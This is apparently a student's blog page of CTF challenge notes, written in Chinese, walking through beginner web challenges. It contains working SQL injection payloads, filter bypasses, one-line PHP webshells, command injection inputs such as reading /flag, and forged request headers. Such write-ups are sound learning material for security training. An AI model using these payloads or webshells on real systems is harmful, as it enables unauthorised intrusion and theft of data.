@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="Suivez">
+  
+
+  
+
+  
+
+  <title>CTFNote | Suivez&#39;s Blog</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/avdet-48vfu-001.ico">
+  
+
+  
+  <!-- config.syntax_highlighter == highlight.js -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.13/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/monokai.min.css">
+  
+  <!-- config.syntax_highlighter == prismjs -->
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(/assets/yanami1.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Suivez&#39;s Blog
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/archives">归档</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">CTFNote</h1>
+          <h2 class="title-sub-wrap">
+            <strong>Tolalal</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2024-10-20T08:23:06.440Z" itemprop="datePublished">2024-10-20</time>
+          </h2>
+          
+            <h2 class="last-time">
+              <span>最后更新于</span>
+              <time  class="article-updated" datetime="2023-03-19T12:06:25.255Z" itemprop="dateUpdated">2023-03-19</time>
+            </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">📒 网络安全</a></li>
+    
+    <li><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/">📒 CTF</a></li>
+    
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/CTF/">🏷️ CTF</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="CTF题目笔记"><a href="#CTF题目笔记" class="headerlink" title="CTF题目笔记"></a>CTF题目笔记</h1><p>遇到不认识的先查，不要刻板印象或置之不理。要善于搜索资料。</p>
+<hr>
+<h3 id="1-初识SQL注入"><a href="#1-初识SQL注入" class="headerlink" title="1.初识SQL注入"></a>1.初识SQL注入</h3><ul>
+<li><p>登录处使用 findadmin方法</p>
+<ul>
+<li><p>‘or 1&#x3D;1–</p>
+</li>
+<li><p>在SQL语句中 username&#x3D;’username‘ and password&#x3D;’password‘</p>
+<p>变成了 username&#x3D;’ ’ or 1&#x3D;1–  ’ and password&#x3D;’password‘</p>
+</li>
+</ul>
+<p>称为SQL注释</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/SQL%E6%B3%A8%E5%85%A5%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="SQL"></p>
+<p>Cookie注入、Post注入、盲注</p>
+</li>
+</ul>
+<blockquote>
+<p>做了cookie，直接进cookie的php页面然后抓cookie.php的包，</p>
+<p>然后在reapter里看回显。拿到flag。</p>
+<p>还做了一道<strong>baby_web</strong>，直接根据提示进index.php（这里主要是</p>
+<p>不知道index是什么（<strong>index.php是首页</strong>））</p>
+<p>或者先抓个包，把get改成index.php然后send，之后直接看response得到flag。</p>
+<p>（其实都很简单主要是不会操作，基础太差）</p>
+<p>还有一道弱口令<strong>weak_auth</strong>就是简单的弱口令（最开始想直接注入（练练手，学了好几天SQL注入了）结果要盲注，不会！只能查怎么爆破了）</p>
+<p>最后用burpsuite爆破账号:admin</p>
+<p>密码:123456</p>
+<p>就真没想到这么weak！！</p>
+</blockquote>
+<h3 id="2-get-post"><a href="#2-get-post" class="headerlink" title="2.get_post"></a>2.get_post</h3><p>可以通过url进行get操作，通过hackbar的postpage进行post操作</p>
+<p><img src="https://article.biliimg.com/bfs/article/5403e84f6dabc1299f173b26367b97be0f29ae9b.png"></p>
+<h3 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h3><p>注意源码泄露问题。</p>
+<p>可用脚本dirsearch进行目录扫描。</p>
+<h3 id="4-warmup"><a href="#4-warmup" class="headerlink" title="4.warmup"></a>4.warmup</h3><p>代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://evefortosaber.github.io/Open-pictures/warmup.png" alt="aa"></p>
+<h3 id="5-相关一句马-知识点"><a href="#5-相关一句马-知识点" class="headerlink" title="5.相关一句马(知识点)"></a>5.相关一句马(知识点)</h3><p><strong><?php eval($_REQUEST['key']);?></strong>  </p>
+<p><strong><?php system($_REQUEST['ab12']);?></strong></p>
+<p><strong><?php eval($_POST[123]);?></strong></p>
+<p>webshell分别为：key，ab12,123</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">? a=fetch&amp;templateFile=<span class="hljs-keyword">public</span>/index&amp;prefix=<span class="hljs-string">&#x27;&#x27;</span>&amp;content&lt;php&gt;<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>)&lt;/php&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/yijian.png" alt="yijian"></p>
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main//yijjian1.png" alt="yijian1"></p>
+<h3 id="6-PHP伪协议"><a href="#6-PHP伪协议" class="headerlink" title="6.PHP伪协议"></a>6.PHP伪协议</h3><p>需要开启allow_url_fopen的: php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory、php:&#x2F;&#x2F;temp</p>
+<p>不需要开启allow_wrl_fopen的：php:&#x2F;&#x2F;filter</p>
+<p>在CTF中常用的 php:&#x2F;&#x2F;filter</p>
+<p>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码<br>php:&#x2F;&#x2F;input 需要post提交数据<br>php:&#x2F;&#x2F;filter可以提交  ?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
+<p>url中?代表传值的意思，id代表变量，后面的”&#x3D;”代表变量的值</p>
+<h3 id="7-SUCTF-2019-EasySQL"><a href="#7-SUCTF-2019-EasySQL" class="headerlink" title="7.[SUCTF 2019]EasySQL"></a>7.[SUCTF 2019]EasySQL</h3><p>一道sql注入的题目，题目原意是堆叠注入或该换||的用处。然而wp中却给出了一种短路处理的办法。</p>
+<p>我们来细究一下它的原理。</p>
+<hr>
+<h4 id="·-直接注"><a href="#·-直接注" class="headerlink" title="· 直接注"></a>· 直接注</h4><p>首先吗看题</p>
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/easysql1.jpg" alt="easysql1"></p>
+<p>然后寻找注入点，先试试<code>&#39;,&quot;,&#39;),&quot;)</code></p>
+<p>然后回显不是“无”就是Nonono.</p>
+<p>在用字符，和整数试试。发现字符时无回显，整数时有！！</p>
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/easysql2.jpg" alt="easysql2"></p>
+<p>这是一个表结构！！</p>
+<p>再审题，发现他说”查询“？怀疑这是个内嵌的后端查询，就是说它的<strong>源码</strong>可能是</p>
+<p><code> select $_POST[&#39;query&#39;] from xxx</code></p>
+<p>越来越靠近真相了！！</p>
+<p>所以它应该是对<code>&#39;,&quot;,&#39;),&quot;)</code>报错了所以什么都不回显或者是过滤，再试试database()发现没有用？？</p>
+<p>上面能回显整数却不回显字符(a,b,c…)，em…有问题。</p>
+<p>回想上一张输入整数的图，他回显了个<code>Array ( [0] =&gt; 1 )</code>,en…它从xxx这个表中返回了1条数据，说明这个数据表xxx中只有一条数据，si~~。</p>
+<p>继续，结合题目</p>
+<blockquote>
+<p>Give me your flag, I will tell you if the flag is right. </p>
+</blockquote>
+<p>flag？is right？  很可能这条数据就是flag！！！</p>
+<p>说明这个源码查询的就是flag！但查不出来为什么？再思考。</p>
+<blockquote>
+<p><code> select 1 from xxx</code>得到的结果就是，一堆1，1的数量与数据数量有关。</p>
+</blockquote>
+<p>又题目输入整数时它都得到1，所以可能这里有个<strong>或结构</strong>，</p>
+<p>所以在 $_POST[‘query’] 这块肯定有玄机，2 xxx &#x3D;&gt; 1??</p>
+<p>难道是 || 语法？试试0. 0的话查不出来.</p>
+<p>再回想源码，（<em><strong>结合上面的分析，不妨把表记作Flag，表中字段为fffff，字段内容为我们要的flag）</strong></em></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> $_POST[<span class="hljs-string">&#x27;query&#x27;</span>] <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure>
+
+<p>所以应该是，</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> $_POST[<span class="hljs-string">&#x27;query&#x27;</span>] <span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure>
+
+<p>flag 本身是假的，不然早注成了！！</p>
+<p>所以直接构造<code> *,1</code>(联系到 select 查询多个的语法)</p>
+<p>然后破案了。</p>
+<p><img src="https://evefortosaber.github.io/Open-pictures/easysql_end.jpg" alt="easysql_end"></p>
+<hr>
+<h4 id="·-另一种姿势"><a href="#·-另一种姿势" class="headerlink" title="· 另一种姿势"></a>· 另一种姿势</h4><p>先上payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode<span class="hljs-operator">=</span>pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>(前面一个1隔断前置select后面一个1？)<br>你直接看这英语意思：</p>
+<p>pipes_as_concat</p>
+<p><strong>就是把 || 设置成了 concat函数呗。。。</strong><br>这也是<strong>猜出了后端代码</strong>的。</p>
+<p>但是要注意<u>分号隔断了前面的命令</u>(堆叠注入)，所以要再次添加select!!</p>
+<p>上面那句执行是：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> concat(<span class="hljs-number">1</span>,flag) <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></table></figure>
+
+<p>搞定。</p>
+<h3 id="8-Easy-sql"><a href="#8-Easy-sql" class="headerlink" title="8.Easy_sql"></a>8.Easy_sql</h3><p>有报错但发现union select 被过滤了，</p>
+<p>where也被过滤了，但可以堆叠。</p>
+<p>所以使用了show tables 查表，show columns from ’table‘ 查字段</p>
+<p>找到了flag字段，问题在于如何查询flag？这里给出了两种解法。</p>
+<blockquote>
+<p>当我们输入1时回显数据，并发现当输入’时报错，联系题目提示的查询，这里的源代码应该时和select有关。</p>
+</blockquote>
+<ol>
+<li><p>使用更改表名和字段名的方法使其默认查询的表字段变为flag的。</p>
+<p>payload为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span><br></code></pre></td></tr></table></figure>
+
+<p>使用了rename，和alter，进行修改。</p>
+</li>
+<li><p>用mysql所支持的另一种查询语句。</p>
+<p>payload为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<blockquote>
+<p>这里需要注意，在之前是先验证了它有回显，有报错，有堆叠！！</p>
+</blockquote>
+<p>相关资料： <a target="_blank" rel="noopener" href="https://blog.csdn.net/JesseYoung/article/details/40785137?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1">handler语法</a> </p>
+<p><img src="https://evefortosaber.github.io/Open-pictures/easy_sql.jpg" alt="easy_sql"></p>
+<h3 id="9-ACTF2020-新生赛-Exec"><a href="#9-ACTF2020-新生赛-Exec" class="headerlink" title="9.[ACTF2020 新生赛]Exec"></a>9.[ACTF2020 新生赛]Exec</h3><p>本题是一道Linux命令题。</p>
+<p>注：ping本身是一种命令行为。</p>
+<p>通过分号断开。</p>
+<p>payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">127.0.0.1;ls<br></code></pre></td></tr></table></figure>
+
+<p>试探是否能命令语句注入。</p>
+<p>结果可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">127.0.0.1;ls /;<br></code></pre></td></tr></table></figure>
+
+<p>遍历目录下的文件。发现flag文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">127.0.0.1;cat /flag;<br></code></pre></td></tr></table></figure>
+
+<p>得到flag。</p>
+<h3 id="10-GXYCTF2019-Ping-Ping-Ping"><a href="#10-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="10.[GXYCTF2019]Ping Ping Ping"></a>10.[GXYCTF2019]Ping Ping Ping</h3><p><code>$IFS$1</code>,<code> %09</code></p>
+<p>为什么用内联执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cat$IFS$<span class="hljs-number">1</span>`ls` <br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/124616206?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166425816516800186510053%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166425816516800186510053&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-124616206-null-null.142%5Ev50%5Econtrol,201%5Ev3%5Econtrol_1&utm_term=%5BGXYCTF2019%5DPing%20Ping%20Ping&spm=1018.2226.3001.4187">Linux绕过</a>，</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62422842/article/details/124616206">详解</a></p>
+<h3 id="11-Secret-File"><a href="#11-Secret-File" class="headerlink" title="11.Secret File"></a>11.Secret File</h3><p>找文件，抓包，看源码，找提示。</p>
+<p>伪协议读取flag.php</p>
+<h3 id="12-LoveSQL"><a href="#12-LoveSQL" class="headerlink" title="12.LoveSQL"></a>12.LoveSQL</h3><p> 试试，直接注，找到提示表，查询到flag。</p>
+<h3 id="13-HTTP"><a href="#13-HTTP" class="headerlink" title="13.HTTP"></a>13.HTTP</h3><p>打开靶场，查看源码。</p>
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/aaahtp.jpg" alt="http_1"></p>
+<p>进入secret.php发现如下</p>
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/ahttp_1.jpg" alt="ahttp_1"></p>
+<p>此处是一个对报文来源的要求，用burp抓包，<strong>修改来源，发现没有Referer，手动添加到upgrade上，或cookie上，内容<code>Referer: https://Sycsecret.buuoj.cn</code></strong></p>
+<p>再发送。得到Response，要求用”Syclover”浏览器，<strong>在User-Agent中修改，Firefox为Syclover。</strong></p>
+<p>再发送。得到Response，**”Read this locally!”<strong>，在upgrade上加一行</strong><code>X-Forwarded-For: 127.0.0.1</code>.**</p>
+<p>再发送。就再Responce中得到flag.</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Secret.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node3.buuoj.cn:29399<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&quot;Syclover&quot; browser         #伪造客户端浏览器<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://www.Sycsecret.com     #伪造<br><span class="hljs-attribute">X-Forwarded-for</span><span class="hljs-punctuation">: </span>127.0.0.1             #伪造源地址<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="14-BUYCTF-BabySql2019"><a href="#14-BUYCTF-BabySql2019" class="headerlink" title="14.BUYCTF[BabySql2019]"></a>14.BUYCTF[BabySql2019]</h3><p>查询源代码，是get请求。</p>
+<p>尝试登录，在输入<code>1&#39;</code>时<strong>报错</strong>，得知是<strong>单引号闭合</strong>。</p>
+<p><strong>选择通过密码进行注入</strong>。</p>
+<p>输入 <code>1&#39; or 1=1 -- &#39;</code>报错，发现报错语句中没有<code>or</code>，应该是<strong>过滤</strong>了。</p>
+<p>尝试: </p>
+<pre><code>1. 双写`oror`
+ 2. 隐写`oorr`
+</code></pre>
+<p>发现2是可行的，1会报错，没有<code>or</code>出现。这里明白是一个’强’过滤。(<strong>即只要有<code>or</code>字节出现在语法中就会过滤</strong>，如<code>inform,password</code>)</p>
+<p>用<code>1&#39; oorr 1=1 -- &#39;</code>成功登入，发现有<img src="https://evefortosaber.github.io/Open-pictures/babysql.jpg" alt="babysql"></p>
+<p>之后用<code>union select</code>通过报错，发现<strong>union，select都被过滤</strong>。</p>
+<p>用<code>uniunionon selselectect 1,1,1</code>查出列名，和对应显示。</p>
+<p><em><strong>palyload</strong></em>如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; uniunionon selselectect 1,database(),3 -- &#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> geek<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; uniunionon selselectect 1,(selselectect group_concat(table_name)frfromom infoorrmation_schema.tables whewherere table_schema=&#x27;</span>geek<span class="hljs-string">&#x27;),3 -- &#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> b4bsql<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whewherere table_schema=&#x27;</span>geek<span class="hljs-string">&#x27; anandd table_name=&#x27;</span>b4bsql<span class="hljs-string">&#x27;),3 -- &#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> id username password<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; uniunionon selselectect 1,2,(selselectect group_concat(concat(id,&#x27;</span> <span class="hljs-string">&#x27;,username,&#x27;</span> <span class="hljs-string">&#x27;,passwoorrd))frfromom geek.b4bsql) -- &#x27;</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-number">8</span> flag flag&#123;<span class="hljs-number">11939082</span><span class="hljs-number">-38</span>b7<span class="hljs-number">-412</span>d<span class="hljs-number">-830</span>a<span class="hljs-operator">-</span>cbe89b508804&#125;<br><span class="hljs-comment">/* 123&#x27;  uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27; anandd table_schema=&#x27;geek&#x27;),(selselectect group_concat(concat(username,&#x27; &#x27;,passwoorrd,&#x27; &#x27;,id)) frfromom geek.b4bsql) -- &#x27; */</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里发现一个<strong>问题</strong>，使用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; uniunionon selselectect 1,2,(selselectect concat(id,&#x27;</span> <span class="hljs-string">&#x27;,username,&#x27;</span> <span class="hljs-string">&#x27;,passwoorrd)frfromom geek.b4bsql) -- &#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><u>报错’ more than one row ‘ 但使用group_concat无报错。</u></p>
+<p><u>concat()返回将相应字段连接成字符串的一列值。</u></p>
+<p><u>group_concat()返回的是一串字符串。</u></p>
+</blockquote>
+<h3 id="15-RoarCTF-2019-Easy-Calc"><a href="#15-RoarCTF-2019-Easy-Calc" class="headerlink" title="15.[RoarCTF 2019]Easy Calc"></a>15.[RoarCTF 2019]Easy Calc</h3><p>计算器。显然不是数据库。不用SQL注入。</p>
+<p>输入<code>1+1 / 1 /&#39; / 1&#39; / &quot; </code>根据报错情况，没啥用。看源码。找到calc.php.</p>
+<p>可以传参num,传一下试试。有waf,php和waf的变量判断方式不一样.</p>
+<p>用php代码注入.</p>
+<p>所以传<code>?%20?num=1</code></p>
+<p>传入并执行了,根据它的过滤规则,堆叠注入.</p>
+<p><code>?%20num=1;var_dump(scandir(chr(47)))</code>(chr(47)是’&#x2F;‘)访问根目录,并打印.</p>
+<p>找到flagg.</p>
+<p><code>?&amp;20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
+<h3 id="16-极客大挑战-2019-PHP"><a href="#16-极客大挑战-2019-PHP" class="headerlink" title="16.[极客大挑战 2019]PHP"></a>16.[极客大挑战 2019]PHP</h3><p>进入题目根据提示：</p>
+<blockquote>
+<p>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</p>
+</blockquote>
+<p>对网站备份扫描 *””E:\burpsuite\备份扫描.py””*使用Python脚本.</p>
+<p>得到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p><img src="https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1_16_01.png" alt="01"></p>
